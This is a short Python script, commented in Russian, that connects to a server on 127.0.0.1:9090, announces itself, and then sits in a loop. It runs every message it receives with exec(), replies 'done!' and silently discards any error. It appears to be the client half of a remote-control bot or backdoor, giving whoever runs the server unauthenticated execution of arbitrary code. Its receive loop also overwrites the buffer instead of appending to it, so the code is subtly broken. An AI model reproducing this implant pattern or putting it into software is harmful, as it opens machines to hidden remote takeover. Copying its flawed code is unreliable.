import json
import socket
import struct
import threading

name = "1"

# создаем сокет
sock = socket.socket()
# подключаемся к 127.0.0.1:9090
sock.connect(('127.0.0.1', 9090))
admin = {
    "id":name
}

connections = []

a = "init"
admin["message"] = a
info = json.dumps(admin)
info2 = struct.pack("<I", len(info))
sock.send(info2)
sock.send(info.encode("utf-8"))

print(admin)

def send(conn, comm):
    info2 = struct.pack("<I", len(comm))
    conn.send(info2)
    conn.send(comm.encode("utf-8"))


def check(conn):
    global name, info
    cool = {
        "id":name,
        "message": "done!"
    }
    coolmes = json.dumps(cool)

    while True:
        data_size = b''

        while len(data_size) < 4:
            data_size += conn.recv(4 - len(data_size))

        size = struct.unpack("<I", data_size)[0]

        data_size = b''

        while len(data_size) < size:
            data_size = conn.recv(size - len(data_size))

        data = data_size.decode("utf-8")

        try:
            exec(data)
            send(conn, coolmes)
        except:
            pass








threading.Thread(target=check, args=[sock]).start()